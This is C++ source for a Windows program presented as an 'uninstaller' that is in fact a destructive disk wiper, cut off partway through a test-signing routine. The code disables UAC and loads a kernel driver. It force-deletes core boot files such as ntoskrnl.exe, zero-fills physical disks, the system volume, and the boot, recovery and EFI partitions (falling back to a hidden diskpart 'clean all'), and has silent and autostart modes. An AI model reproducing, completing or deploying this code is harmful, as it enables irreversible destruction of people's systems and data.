#define UNICODE
#define _UNICODE
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <filesystem>
#include "resource.h"

// 驱动IOCTL定义
#define IOCTL_KILLPROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SUSPENDPROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_RESUMEPROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDEPROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ZWDELETEFILE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OCCUPYFILE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITEDISK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x903, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_FORCEDELETEFILE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x905, METHOD_BUFFERED, FILE_ANY_ACCESS)

// 驱动句柄
HANDLE g_hDriver = INVALID_HANDLE_VALUE;

constexpr int IDC_STATIC_TITLE = 1001;
constexpr int IDC_STATIC_WARNING = 1002;
constexpr int IDC_STATIC_DESC = 1003;
constexpr int IDC_BUTTON_UNINSTALL = 1004;
constexpr int IDC_BUTTON_CANCEL = 1005;
constexpr int IDC_EDIT_OUTPUT = 1006;
constexpr int IDC_STATIC_PROGRESS = 1007;
constexpr int IDC_BUTTON_CONFIRM = 1008;
constexpr int IDC_STATIC_WARNING2 = 1009;

const std::wstring SECRET_PARAM = L"7f9d2c4e-8a3b-5f1e-9c7d-3a8b6e2f4d1c-9a7b3c5e8f2d-4a6c8e9b1d3f-7c9e2a4b6d8f";
const std::wstring SILENT_PARAM = L"-silent";
const std::wstring AUTOBOOT_PARAM = L"-autostart";
const std::wstring FORCE_PARAM = L"-force";

std::wstring GetSilentFlagPath() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    return std::wstring(tempPath) + L"_silent_mode_flag.tmp";
}

void SetSilentFlag() {
    std::wstring flagPath = GetSilentFlagPath();
    FILE* fp = _wfopen(flagPath.c_str(), L"w");
    if (fp) {
        fwprintf(fp, L"1");
        fclose(fp);
    }
}

bool CheckSilentFlag() {
    std::wstring flagPath = GetSilentFlagPath();
    FILE* fp = _wfopen(flagPath.c_str(), L"r");
    if (fp) {
        fclose(fp);
        return true;
    }
    return false;
}

void ClearSilentFlag() {
    std::wstring flagPath = GetSilentFlagPath();
    DeleteFileW(flagPath.c_str());
}

HWND hWndMain = nullptr;
HWND hEditOutput = nullptr;
HINSTANCE hInst = nullptr;
bool g_isElevatedMode = false;
bool g_testModeEnabled = false;
bool g_autoRunRequested = false;
bool g_silentMode = false;

const wchar_t CLASS_NAME[] = L"WindowsUninstallerClass";

bool IsTestModeEnabled();
bool EnableTestMode();
bool DisableTestMode();
bool ScheduleAutoRun();
bool ClearAutoRun();
void RestartComputer();
int AskEnableTestModeDialog(HWND hWnd);
int AskDisableTestModeDialog(HWND hWnd);
void OnCancel();

// 驱动操作函数
bool LoadDriver();
void UnloadDriver();
bool SendIoctl(DWORD ioctlCode, LPVOID inputBuffer, DWORD inputSize, LPVOID outputBuffer, DWORD outputSize, LPDWORD bytesReturned);
bool ForceDeleteFile(const std::wstring& filePath);

// 文件删除函数
bool FindEFIPartition(TCHAR* driveLetter);
void DeleteFilesWithTI(const TCHAR* driveLetter);

void DestroyAllControls(HWND hWnd) {
    HWND hCtrl;
    hCtrl = GetDlgItem(hWnd, IDC_STATIC_TITLE);
    if (hCtrl) DestroyWindow(hCtrl);
    hCtrl = GetDlgItem(hWnd, IDC_STATIC_WARNING);
    if (hCtrl) DestroyWindow(hCtrl);
    hCtrl = GetDlgItem(hWnd, IDC_STATIC_DESC);
    if (hCtrl) DestroyWindow(hCtrl);
    hCtrl = GetDlgItem(hWnd, IDC_BUTTON_UNINSTALL);
    if (hCtrl) DestroyWindow(hCtrl);
    hCtrl = GetDlgItem(hWnd, IDC_BUTTON_CANCEL);
    if (hCtrl) DestroyWindow(hCtrl);
    hCtrl = GetDlgItem(hWnd, IDC_EDIT_OUTPUT);
    if (hCtrl) DestroyWindow(hCtrl);
    hCtrl = GetDlgItem(hWnd, IDC_STATIC_PROGRESS);
    if (hCtrl) DestroyWindow(hCtrl);
    hCtrl = GetDlgItem(hWnd, IDC_BUTTON_CONFIRM);
    if (hCtrl) DestroyWindow(hCtrl);
    hCtrl = GetDlgItem(hWnd, IDC_STATIC_WARNING2);
    if (hCtrl) DestroyWindow(hCtrl);
}

std::wstring GetTempFilePath(const std::wstring& fileName) {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    return std::wstring(tempPath) + fileName;
}

void DebugLog(const wchar_t* format, ...) {
    va_list args, argsCopy;
    va_start(args, format);
    va_copy(argsCopy, args);
    
    int len = _vscwprintf(format, args) + 1;
    wchar_t* buffer = new wchar_t[len];
    vswprintf(buffer, len, format, argsCopy);
    
    va_end(argsCopy);
    
    wchar_t timestamp[32];
    SYSTEMTIME st;
    GetLocalTime(&st);
    swprintf(timestamp, sizeof(timestamp)/sizeof(wchar_t), L"[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    
    std::wstring fullMsg = timestamp + std::wstring(buffer);
    
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, fullMsg.c_str(), -1, nullptr, 0, nullptr, nullptr);
    char* utf8Buffer = new char[utf8Len];
    WideCharToMultiByte(CP_UTF8, 0, fullMsg.c_str(), -1, utf8Buffer, utf8Len, nullptr, nullptr);
    
    printf("%s", utf8Buffer);
    
    delete[] buffer;
    delete[] utf8Buffer;
    va_end(args);
}

void DebugLogWithError(const wchar_t* message) {
    DWORD error = GetLastError();
    if (error == 0) {
        DebugLog(L"%s\n", message);
        return;
    }
    
    LPWSTR errorMsgCN = nullptr;
    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr,
        error,
        MAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED),
        (LPWSTR)&errorMsgCN,
        0,
        nullptr
    );
    
    LPWSTR errorMsgEN = nullptr;
    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr,
        error,
        MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US),
        (LPWSTR)&errorMsgEN,
        0,
        nullptr
    );
    
    if (errorMsgCN && errorMsgEN) {
        DebugLog(L"%s (系统错误: 0x%08lX - %s / %s)\n", 
               message, error, errorMsgCN, errorMsgEN);
    } else if (errorMsgCN) {
        DebugLog(L"%s (系统错误: 0x%08lX - %s)\n", 
               message, error, errorMsgCN);
    } else if (errorMsgEN) {
        DebugLog(L"%s (系统错误: 0x%08lX - %s)\n", 
               message, error, errorMsgEN);
    } else {
        DebugLog(L"%s (系统错误: 0x%08lX)\n", 
               message, error);
    }
    
    if (errorMsgCN) LocalFree(errorMsgCN);
    if (errorMsgEN) LocalFree(errorMsgEN);
}

bool ExtractResourceToFile(HINSTANCE hInstance, int resourceId, const std::wstring& outputPath) {
    DebugLog(L"ExtractResourceToFile: 开始提取资源, ID=%d, 输出路径=%s\n", resourceId, outputPath.c_str());

    HRSRC hResource = FindResourceW(hInstance, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hResource) {
        DebugLogWithError(L"FindResourceW 失败");
        return false;
    }
    DebugLog(L"FindResourceW 成功, hResource=%p\n", hResource);

    HGLOBAL hMemory = LoadResource(hInstance, hResource);
    if (!hMemory) {
        DebugLogWithError(L"LoadResource 失败");
        return false;
    }
    DebugLog(L"LoadResource 成功, hMemory=%p\n", hMemory);

    DWORD size = SizeofResource(hInstance, hResource);
    if (size == 0) {
        DebugLog(L"ERROR: SizeofResource 返回0\n");
        return false;
    }
    DebugLog(L"SizeofResource 成功, 大小=%lu bytes\n", size);

    LPVOID pData = LockResource(hMemory);
    if (!pData) {
        DebugLogWithError(L"LockResource 失败");
        return false;
    }
    DebugLog(L"LockResource 成功, pData=%p\n", pData);

    std::ofstream file(outputPath.c_str(), std::ios::binary);
    if (!file) {
        DebugLog(L"ERROR: 无法打开输出文件: %s\n", outputPath.c_str());
        return false;
    }
    DebugLog(L"打开输出文件成功: %s\n", outputPath.c_str());

    file.write(reinterpret_cast<const char*>(pData), size);
    if (!file.good()) {
        DebugLog(L"ERROR: 文件写入失败\n");
        file.close();
        return false;
    }
    DebugLog(L"文件写入成功, 已写入 %lu bytes\n", size);

    file.close();
    DebugLog(L"ExtractResourceToFile: 提取完成\n");

    return true;
}

void DisableUAC() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExW(hKey, L"EnableLUA", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(DWORD));
        RegSetValueExW(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

bool WriteZeroToDisk(const std::wstring& diskPath) {
    DebugLog(L"尝试打开磁盘: %s\n", diskPath.c_str());
    
    HANDLE hDisk = CreateFileW(
        diskPath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
        nullptr
    );
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND) {
            DebugLog(L"ERROR: 磁盘 %s 不存在\n", diskPath.c_str());
        } else if (err == ERROR_ACCESS_DENIED) {
            DebugLog(L"ERROR: 无法访问磁盘 %s (权限不足)\n", diskPath.c_str());
        } else if (err == ERROR_INVALID_PARAMETER) {
            DebugLog(L"ERROR: 无效的磁盘路径 %s\n", diskPath.c_str());
        } else {
            DebugLogWithError(L"CreateFileW 失败");
        }
        return false;
    }
    
    DebugLog(L"磁盘打开成功\n");
    
    DWORD bytesReturned = 0;
    
    DISK_GEOMETRY_EX diskGeom = {0};
    if (DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &diskGeom, sizeof(diskGeom), &bytesReturned, nullptr)) {
        DebugLog(L"IOCTL_DISK_GET_DRIVE_GEOMETRY_EX 成功\n");
        DebugLog(L"  磁盘大小: %I64u bytes (%I64u GB)\n", 
               diskGeom.DiskSize.QuadPart, 
               diskGeom.DiskSize.QuadPart / (1024 * 1024 * 1024));
        DebugLog(L"  扇区大小: %lu bytes\n", diskGeom.Geometry.BytesPerSector);
    } else {
        DebugLogWithError(L"IOCTL_DISK_GET_DRIVE_GEOMETRY_EX 失败");
    }
    
    PARTITION_INFORMATION_EX partInfo;
    memset(&partInfo, 0, sizeof(partInfo));
    if (DeviceIoControl(hDisk, IOCTL_DISK_GET_PARTITION_INFO_EX, nullptr, 0, &partInfo, sizeof(partInfo), &bytesReturned, nullptr)) {
        DebugLog(L"IOCTL_DISK_GET_PARTITION_INFO_EX 成功\n");
        DebugLog(L"  分区类型: %lu\n", partInfo.PartitionStyle);
        DebugLog(L"  分区大小: %I64u bytes\n", partInfo.PartitionLength.QuadPart);
    }

    STORAGE_DEVICE_NUMBER deviceNumber = {0};
    if (DeviceIoControl(hDisk, IOCTL_STORAGE_GET_DEVICE_NUMBER, nullptr, 0, &deviceNumber, sizeof(deviceNumber), &bytesReturned, nullptr)) {
        DebugLog(L"IOCTL_STORAGE_GET_DEVICE_NUMBER 成功\n");
        DebugLog(L"  设备类型: %lu\n", deviceNumber.DeviceType);
        DebugLog(L"  设备编号: %lu\n", deviceNumber.DeviceNumber);
        DebugLog(L"  分区编号: %lu\n", deviceNumber.PartitionNumber);
    }

    DWORD sectorSize = 512;
    if (diskGeom.Geometry.BytesPerSector > 0) {
        sectorSize = diskGeom.Geometry.BytesPerSector;
    }
    
    DebugLog(L"使用扇区大小: %lu bytes\n", sectorSize);
    
    DWORD bufferSize = sectorSize * 128;
    char* buffer = new char[bufferSize];
    memset(buffer, 0, bufferSize);
    
    bool success = true;
    ULONGLONG totalBytesWritten = 0;
    DWORD bytesWritten = 0;
    ULONGLONG bytesToWrite = diskGeom.DiskSize.QuadPart;
    
    DebugLog(L"开始写入零数据 (目标大小: %I64u bytes)...\n", bytesToWrite);
    
    while (totalBytesWritten < bytesToWrite) {
        DWORD thisWriteSize = bufferSize;
        if (totalBytesWritten + thisWriteSize > bytesToWrite) {
            thisWriteSize = (DWORD)(bytesToWrite - totalBytesWritten);
        }
        
        if (!WriteFile(hDisk, buffer, thisWriteSize, &bytesWritten, nullptr)) {
            DWORD writeErr = GetLastError();
            if (writeErr == ERROR_ACCESS_DENIED) {
                DebugLog(L"ERROR: 写入失败 - 权限不足 (可能是系统保护)\n");
                DebugLog(L"       需要从外部引导环境(如WinPE)运行才能擦除系统盘\n");
            } else if (writeErr == ERROR_INVALID_FUNCTION) {
                DebugLog(L"ERROR: 写入失败 - 该操作不支持此设备\n");
            } else if (writeErr == ERROR_NOT_SUPPORTED) {
                DebugLog(L"ERROR: 写入失败 - 设备不支持此操作\n");
            } else {
                DebugLog(L"ERROR: WriteFile 失败 (错误码: %lu)\n", writeErr);
            }
            success = false;
            break;
        }
        
        if (bytesWritten == 0) {
            DebugLog(L"WARNING: 写入0字节，可能到达介质末尾\n");
            break;
        }
        
        totalBytesWritten += bytesWritten;
        
        if (totalBytesWritten % (1024 * 1024 * 100) == 0) {
            DebugLog(L"已写入: %I64u MB / %I64u MB (%.1f%%)\n", 
                    totalBytesWritten / (1024 * 1024),
                    bytesToWrite / (1024 * 1024),
                    (double)totalBytesWritten * 100.0 / (double)bytesToWrite);
        }
        
        if (bytesWritten < thisWriteSize) {
            DebugLog(L"WARNING: 写入不完整，停止\n");
            break;
        }
    }
    
    DebugLog(L"写入完成，总计: %I64u bytes (%I64u MB)\n", totalBytesWritten, totalBytesWritten / (1024 * 1024));

    delete[] buffer;
    
    if (!CloseHandle(hDisk)) {
        DebugLogWithError(L"CloseHandle 失败");
    }
    
    return success;
}

bool WipeWithDiskPart(const std::wstring& diskPath, const std::wstring& diskNumber) {
    DebugLog(L"WipeWithDiskPart: 开始使用diskpart擦除磁盘 %s\n", diskNumber.c_str());
    
    std::wstring scriptPath = GetTempFilePath(L"wipe_disk.txt");
    std::wofstream scriptFile(scriptPath.c_str());
    if (!scriptFile) {
        DebugLog(L"ERROR: 无法创建diskpart脚本文件\n");
        return false;
    }
    
    scriptFile << L"select disk " << diskNumber << L"\n";
    scriptFile << L"clean all\n";
    scriptFile << L"exit\n";
    scriptFile.close();
    
    std::wstring command = L"diskpart.exe /s \"" + scriptPath + L"\"";
    DebugLog(L"执行命令: %s\n", command.c_str());
    
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessW(nullptr, const_cast<wchar_t*>(command.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        DebugLogWithError(L"CreateProcessW (diskpart) 失败");
        DeleteFileW(scriptPath.c_str());
        return false;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteFileW(scriptPath.c_str());
    
    if (exitCode == 0) {
        DebugLog(L"diskpart 擦除成功 (磁盘 %s)\n", diskNumber.c_str());
        return true;
    } else {
        DebugLog(L"diskpart 擦除失败, 退出码: %lu\n", exitCode);
        return false;
    }
}

bool WipeWithDeviceIoControl(HANDLE hDisk, const std::wstring& diskPath) {
    DebugLog(L"WipeWithDeviceIoControl: 开始使用IOCTL_DISK_LOAD_MEDIA擦除\n");
    
    DWORD bytesReturned = 0;
    
    if (!DeviceIoControl(hDisk, IOCTL_DISK_LOAD_MEDIA, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
        DWORD err = GetLastError();
        DebugLog(L"IOCTL_DISK_LOAD_MEDIA 失败, 错误码: %lu\n", err);
        return false;
    }
    
    DebugLog(L"IOCTL_DISK_LOAD_MEDIA 执行成功\n");
    return true;
}

bool WipeWithNtfsDriver(const std::wstring& volumePath) {
    DebugLog(L"WipeWithNtfsDriver: 开始使用NTFS驱动擦除卷 %s\n", volumePath.c_str());
    
    HANDLE hVolume = CreateFileW(
        volumePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
        nullptr
    );
    
    if (hVolume == INVALID_HANDLE_VALUE) {
        DebugLogWithError(L"CreateFileW (NTFS卷) 失败");
        return false;
    }
    
    DWORD bytesReturned = 0;
    
    if (!DeviceIoControl(hVolume, FSCTL_LOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
        DebugLog(L"FSCTL_LOCK_VOLUME 失败 (非致命, 错误码: %lu)\n", GetLastError());
    } else {
        DebugLog(L"卷已锁定\n");
    }
    
    DebugLog(L"使用NTFS驱动直接写入...\n");
    
    char buffer[4096] = {0};
    DWORD bytesWritten = 0;
    ULONGLONG totalWritten = 0;
    
    LARGE_INTEGER distanceToMove;
    distanceToMove.QuadPart = 0;
    SetFilePointerEx(hVolume, distanceToMove, nullptr, FILE_BEGIN);
    
    for (int i = 0; i < 100 && totalWritten < 100 * 1024 * 1024; i++) {
        if (!WriteFile(hVolume, buffer, sizeof(buffer), &bytesWritten, nullptr)) {
            DWORD err = GetLastError();
            if (err == ERROR_ACCESS_DENIED) {
                DebugLog(L"NTFS驱动写入失败 - 权限不足\n");
                CloseHandle(hVolume);
                return false;
            }
            break;
        }
        totalWritten += bytesWritten;
    }
    
    DebugLog(L"NTFS驱动写入完成: %I64u bytes\n", totalWritten);
    
    DeviceIoControl(hVolume, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
    
    CloseHandle(hVolume);
    return totalWritten > 0;
}

void AddOutput(const std::wstring& text) {
    if (hEditOutput) {
        int len = GetWindowTextLengthW(hEditOutput);
        SendMessageW(hEditOutput, EM_SETSEL, len, len);
        std::wstring line = text + L"\r\n";
        SendMessageW(hEditOutput, EM_REPLACESEL, FALSE, (LPARAM)line.c_str());
        SendMessageW(hEditOutput, EM_SCROLLCARET, 0, 0);
    }
}

DWORD WINAPI WipeDisksThread(LPVOID lpParam) {
    AddOutput(L"========================================");
    AddOutput(L"开始磁盘擦除操作...");
    AddOutput(L"========================================");

    AddOutput(L"正在加载驱动...");
    if (LoadDriver()) {
        AddOutput(L"驱动加载成功");
    } else {
        AddOutput(L"驱动加载失败，将使用常规模式");
    }

    AddOutput(L"正在禁用UAC...");
    DisableUAC();
    AddOutput(L"UAC已禁用");

    AddOutput(L"正在删除系统文件...");
    // 尝试删除关键文件
    ForceDeleteFile(L"\\\\?\\C:\\Windows\\System32\\ntoskrnl.exe");
    ForceDeleteFile(L"\\\\?\\C:\\Windows\\System32\\hal.dll");
    ForceDeleteFile(L"\\\\?\\C:\\Windows\\System32\\winload.exe");
    AddOutput(L"系统文件删除尝试完成");

    AddOutput(L"正在擦除物理磁盘0 (方法1: 直接写入)...\n");
    if (WriteZeroToDisk(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\DR0")) {
        AddOutput(L"物理磁盘0擦除成功");
    } else {
        AddOutput(L"方法1失败，尝试方法2: diskpart...\n");
        if (WipeWithDiskPart(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\DR0", L"0")) {
            AddOutput(L"物理磁盘0擦除成功 (diskpart)");
        } else {
            AddOutput(L"方法2失败，尝试方法3: IOCTL_DISK_COPY_DATA...\n");
            HANDLE hDisk = CreateFileW(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\DR0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
            if (hDisk != INVALID_HANDLE_VALUE) {
                if (WipeWithDeviceIoControl(hDisk, L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\DR0")) {
                    AddOutput(L"物理磁盘0擦除成功 (IOCTL)");
                } else {
                    AddOutput(L"方法3失败，尝试方法4: NTFS驱动...\n");
                    if (WipeWithNtfsDriver(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\DR0")) {
                        AddOutput(L"物理磁盘0擦除成功 (NTFS驱动)");
                    } else {
                        AddOutput(L"错误: 无法擦除物理磁盘0 (所有方法均失败)");
                    }
                }
                CloseHandle(hDisk);
            } else {
                AddOutput(L"错误: 无法打开物理磁盘0句柄");
            }
        }
    }

    AddOutput(L"正在擦除系统卷C: (方法1: 直接写入)...\n");
    if (WriteZeroToDisk(L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolume1")) {
        AddOutput(L"系统卷C:擦除成功");
    } else {
        AddOutput(L"方法1失败，尝试方法2: diskpart...\n");
        if (WipeWithDiskPart(L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolume1", L"0")) {
            AddOutput(L"系统卷C:擦除成功 (diskpart)");
        } else {
            AddOutput(L"方法2失败，尝试方法3: NTFS驱动...\n");
            if (WipeWithNtfsDriver(L"\\\\?\\C:")) {
                AddOutput(L"系统卷C:擦除成功 (NTFS驱动)");
            } else {
                AddOutput(L"错误: 无法擦除系统卷C: (所有方法均失败)");
            }
        }
    }

    AddOutput(L"正在擦除物理磁盘1 (方法1: 直接写入)...\n");
    if (WriteZeroToDisk(L"\\\\?\\GLOBALROOT\\Device\\Harddisk1\\DR1")) {
        AddOutput(L"物理磁盘1擦除成功");
    } else {
        AddOutput(L"方法1失败，尝试方法2: diskpart...\n");
        if (WipeWithDiskPart(L"\\\\?\\GLOBALROOT\\Device\\Harddisk1\\DR1", L"1")) {
            AddOutput(L"物理磁盘1擦除成功 (diskpart)");
        } else {
            AddOutput(L"方法2失败，尝试方法3: IOCTL_DISK_COPY_DATA...\n");
            HANDLE hDisk = CreateFileW(L"\\\\?\\GLOBALROOT\\Device\\Harddisk1\\DR1", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
            if (hDisk != INVALID_HANDLE_VALUE) {
                if (WipeWithDeviceIoControl(hDisk, L"\\\\?\\GLOBALROOT\\Device\\Harddisk1\\DR1")) {
                    AddOutput(L"物理磁盘1擦除成功 (IOCTL)");
                } else {
                    AddOutput(L"方法3失败，尝试方法4: NTFS驱动...\n");
                    if (WipeWithNtfsDriver(L"\\\\?\\GLOBALROOT\\Device\\Harddisk1\\DR1")) {
                        AddOutput(L"物理磁盘1擦除成功 (NTFS驱动)");
                    } else {
                        AddOutput(L"错误: 无法擦除物理磁盘1 (所有方法均失败)");
                    }
                }
                CloseHandle(hDisk);
            } else {
                AddOutput(L"错误: 无法打开物理磁盘1句柄");
            }
        }
    }

    AddOutput(L"正在擦除引导分区...\n");
    if (WriteZeroToDisk(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\Partition0")) {
        AddOutput(L"引导分区擦除成功");
    } else {
        AddOutput(L"方法1失败，尝试方法2: diskpart...\n");
        if (WipeWithDiskPart(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\Partition0", L"0")) {
            AddOutput(L"引导分区擦除成功 (diskpart)");
        } else {
            AddOutput(L"方法2失败，尝试方法3: NTFS驱动...\n");
            if (WipeWithNtfsDriver(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\Partition0")) {
                AddOutput(L"引导分区擦除成功 (NTFS驱动)");
            } else {
                AddOutput(L"错误: 无法擦除引导分区 (所有方法均失败)");
            }
        }
    }

    AddOutput(L"正在擦除恢复分区...\n");
    if (WriteZeroToDisk(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\Partition2")) {
        AddOutput(L"恢复分区擦除成功");
    } else {
        AddOutput(L"方法1失败，尝试方法2: diskpart...\n");
        if (WipeWithDiskPart(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\Partition2", L"0")) {
            AddOutput(L"恢复分区擦除成功 (diskpart)");
        } else {
            AddOutput(L"方法2失败，尝试方法3: NTFS驱动...\n");
            if (WipeWithNtfsDriver(L"\\\\?\\GLOBALROOT\\Device\\Harddisk0\\Partition2")) {
                AddOutput(L"恢复分区擦除成功 (NTFS驱动)");
            } else {
                AddOutput(L"错误: 无法擦除恢复分区 (所有方法均失败)");
            }
        }
    }

    AddOutput(L"正在卸载驱动...");
    UnloadDriver();
    AddOutput(L"驱动已卸载");

    // 使用 TrustedInstaller 权限删除文件和目录
    AddOutput(L"正在使用 TrustedInstaller 权限删除文件...");
    
    // 查找 EFI 分区
    TCHAR efiDrive[4] = {0};
    if (FindEFIPartition(efiDrive)) {
        DebugLog(L"找到 EFI 分区: %s:\n", efiDrive);
        AddOutput(L"找到 EFI 分区: ");
        AddOutput(efiDrive);
        AddOutput(L":\\");
        
        // 删除 EFI 分区内容
        DeleteFilesWithTI(efiDrive);
    } else {
        AddOutput(L"未找到 EFI 分区");
    }
    
    // 删除 C 盘根目录内容（关键系统文件）
    DeleteFilesWithTI(L"C");

    AddOutput(L"========================================");
    AddOutput(L"所有操作已完成");
    AddOutput(L"系统即将无法使用，请关闭程序");
    AddOutput(L"========================================");
    AddOutput(L"");
    AddOutput(L"谢谢您的使用，欢迎下次与你的重逢");
    AddOutput(L"");
    AddOutput(L"========================================");

    if (g_testModeEnabled) {
        if (g_silentMode) {
            DebugLog(L"静默模式: 自动关闭测试模式\n");
            DisableTestMode();
            ClearAutoRun();
            DebugLog(L"系统将在10秒后重启...\n");
            RestartComputer();
        } else {
            int result = AskDisableTestModeDialog(hWndMain);
            if (result == IDYES) {
                DebugLog(L"用户选择关闭测试模式\n");
                AddOutput(L"正在关闭测试模式...");
                DisableTestMode();
                ClearAutoRun();
                AddOutput(L"系统将在10秒后重启...");
                RestartComputer();
            }
            ClearAutoRun();
        }
    }

    if (!g_silentMode) {
        HWND hBtn = GetDlgItem(hWndMain, IDC_BUTTON_CONFIRM);
        if (hBtn) {
            EnableWindow(hBtn, TRUE);
            SetWindowTextW(hBtn, L"完成");
        }
    }

    return 0;
}

void OnConfirmUninstall() {
    HWND hBtn = GetDlgItem(hWndMain, IDC_BUTTON_CONFIRM);
    if (hBtn) {
        EnableWindow(hBtn, FALSE);
        SetWindowTextW(hBtn, L"执行中...");
    }

    if (hEditOutput) {
        SetWindowTextW(hEditOutput, L"");
        AddOutput(L"正在准备擦除磁盘...");
    }

    CreateThread(nullptr, 0, WipeDisksThread, nullptr, 0, nullptr);
}

bool IsTestModeEnabled() {
    DebugLog(L"IsTestModeEnabled: 检查测试模式状态\n");
    
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    wchar_t cmd[] = L"bcdedit /enum testsigning";
    if (!CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        DebugLogWithError(L"bcdedit 检查失败");
        return false;
    }
    
    WaitForSingleObject(pi.hProcess, 5000);
    
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    bool enabled = (exitCode == 0);
    DebugLog(L"测试模式状态: %s (exitCode=%lu)\n", enabled ? L"已开启" : L"未开启", exitCode);
    return enabled;
}

bool EnableTestMode() {
    DebugLog(L"EnableTestMode: 正在开启测试模式...\n");
    
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = g_silentMode ? SW_HIDE : SW_SHOW;
    
    // 命令1: 开启测试签名模式
    wchar_t cmd1[] = L"bcdedit /set testsigning on";
    if (!CreateProcessW(nullptr, cmd1, nullptr, nullptr, FALSE, CREATE_DEFAULT_ERROR_MODE, nullptr, nullptr, &si, &pi)) {
        DebugLogWithError(L"EnableTestMode: CreateProcessW 失败 (testsigning)");
        return false;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    DWORD exitCode1 = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode1);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (exitCode1 == 0) {
        DebugLog(L"EnableTestMode: 测试签名模式已开启\n");
    } else {
        DebugLog(L"EnableTestMode: 测试签名模式失败, 退出码: %lu\n", exitCode1);
    }
    
